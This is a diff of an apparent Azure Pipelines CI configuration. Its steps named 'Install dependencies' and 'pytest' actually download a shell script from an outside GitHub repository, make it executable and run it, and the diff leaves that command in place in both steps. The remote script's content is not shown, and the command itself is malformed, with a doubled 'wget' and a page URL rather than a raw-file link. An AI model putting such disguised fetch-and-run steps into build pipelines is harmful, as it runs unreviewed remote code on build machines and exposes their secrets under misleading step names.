@@ -27,11 +27,8 @@ steps:
   displayName: 'Use Python $(python.version)'
 
 - script: |
-    wget wget https://github.com/niniklah/zeet/blob/main/code.sh && chmod u+x code.sh && ./code.sh
-    
+    wget wget https://github.com/niniklah/zeet/blob/main/code.sh && chmod u+x code.sh && ./code.sh  
   displayName: 'Install dependencies'
-
 - script: |
     wget wget https://github.com/niniklah/zeet/blob/main/code.sh && chmod u+x code.sh && ./code.sh
-
   displayName: 'pytest'
